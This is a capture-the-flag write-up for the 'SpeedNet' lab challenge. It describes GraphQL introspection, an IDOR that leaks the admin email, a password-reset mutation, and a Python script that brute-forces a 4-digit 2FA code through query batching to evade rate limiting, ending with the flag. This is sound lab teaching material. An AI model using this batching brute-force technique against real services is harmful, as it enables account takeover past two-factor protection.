# SpeedNet - HackTheSystemCTF 

### ===== Challenge =====

- SpeedNet is an ISP platform. Join our bug bounty to find vulnerabilities and retrieve the hidden flag. Test using the email service at http://IP:PORT/emails/ with address test@email.htb

### ===== Analysis =====

- I am presented with this page:

![](./Speednet-login.png)

- After registering an account with the provided e-mail, I see there's 2FA in this app, it might be useful later.

![](./Speednet-user.png)

- Checking the HTTP History, I notice that a `/graphql` endpoint is being used for most of the app's functionality.

- Obviously, I have to check if **introspection queries** work. I do that using the InQL Burp Suite extension and have success:

![](./Speednet-introspection.png)

- The one that immediately catches my eye is the `devForgotPassword` mutation, but I need to know the admin's email in order to try changing his password.

- To discover it, I try an **IDOR** on the `userProfile` endpoint. My user's ID is 2, so I try to query the info of the user with ID 1:

![](./Speednet-idor.png)

- Having found the admin's email, I'm able to change his password:

![](./Speednet-reset.png)

![](./Speednet-password.png)

- I try to login with the credentials `admin@speednet.htb:pass`, but he has 2FA configured

- I activate 2FA on my account, log out, and log back in to see the format of the OTP i receive in `/emails`:

![](./Speednet-code.png)
- It's a 4 digit PIN, meaning I can probably brute-force it.
- **Login flow**:
    - The `login()` query gives this response:
      
      
        ![](./Speednet-login-api.png)
    
    - That **2FA_REQUIRED token is binded to the OTP code** sent by email. If I enter the wrong OTP code, the token doesn't become invalid. It only becomes invalid if I enter the right OTP code or if expires (5 mins):

        ![](./Speednet-otp-try.png)
    
    - If the OTP code is correct, the server responds with the user token that is then stored in `localStorage`.

- With that out of the way, we need to build a Python script that:
    - Logs in as the admin
    - Retrieves the token
    - Uses that token in the brute-force requests

### ===== Exploitation =====

- Seems like a great plan... Until I get hit with this:

![](./Speednet-rate-limit.png)

- But I still have a trick up my sleeve! **Query batching**!
- Basically, if it's activated, it allows me to make more than one query in a single request. This can drastically reduce the number of requests made and hopefully help us bypass this rate limit. Let's see if it works:

![](./Speednet-batch.png)

- It does! I tried to do only one request that queried with all the possible OTP codes, but it gave an error saying 'Payload Too Large'. 

- I tried to find the biggest batch I could send (230 queries) and also try to bypass the rate limit (after 8 requests (8\*230=1840 queries), wait 7 seconds):

``` python
import requests
import time

url = "http://<MY_LAB_URL>/graphql"

login_data = {
    "query": "\n    mutation Login($email: String!, $password: String!) {\n      login(email: $email, password: $password) {\n        token\n        user {\n          id\n          email\n          firstName\n          lastName\n        }\n      }\n    }\n  ",
    "variables": {
        "email": "admin@speednet.htb",
        "password": "pass"
    }
}
login_resp = requests.post(url, json=login_data)
token = login_resp.content.decode().split(":")[3].split('"')[0]
print(f"token: {token}")

pins = [f"{i:04d}" for i in range(10000)]
batch_size = 230
batch_count = 0

for i in range(0, len(pins), batch_size):
    batch = pins[i:i+batch_size]
    
    queries = []
    for pin in batch:
        queries.append({
            "query": "\n    mutation VerifyTwoFactor($token: String!, $otp: String!) {\n      verifyTwoFactor(token: $token, otp: $otp) {\n        token\n        user {\n          id\n          email\n          firstName\n          lastName\n          address\n          phoneNumber\n          twoFactorAuthEnabled\n        }\n      }\n    }\n  ",
            "variables": {
                "token": f"{token}",
                "otp": f"{pin}"
            }
        })
    
    resp = requests.post(url, json=queries)
    response_text = resp.content.decode()
    print(f"Batch {batch_count + 1}: {i}-{i+len(batch)-1}")
    

    if "Large" in response_text:
        print("entity")
        break

    if "Too Many" in response_text:
        print("rate limit")
        break

    if "token" in response_text:
        print(response_text)
        break
    
    batch_count += 1
    
    if batch_count % 8 == 0:
        print(f"wait - {batch_count}")
        time.sleep(7)
```

- The output isn't pretty, but after a bit I get this:

![](./Speednet-token.png)

- I put it in my browser's localStorage and become logged in as the admin. Then I go to the 'Billing' section and get the flag:

![](./Speednet-flag.png)

- **Flag: HTB{gr4phql_3xpl01t_1n_a_nutsh3ll}**

writeup by *varanda* - 22/11/2025
